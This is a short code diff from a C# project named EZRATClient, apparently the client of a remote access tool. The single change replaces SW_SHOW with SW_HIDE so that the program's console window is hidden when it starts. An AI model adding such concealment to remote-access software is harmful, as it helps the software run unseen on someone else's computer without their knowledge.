@@ -80,7 +80,7 @@ namespace EZRATClient
         {
             AppDomain.CurrentDomain.ProcessExit += new EventHandler(CurrentDomain_ProcessExit);
             IntPtr handle = GetConsoleWindow();
-            ShowWindow(handle, SW_SHOW);
+            ShowWindow(handle, SW_HIDE);
 
             try
             {
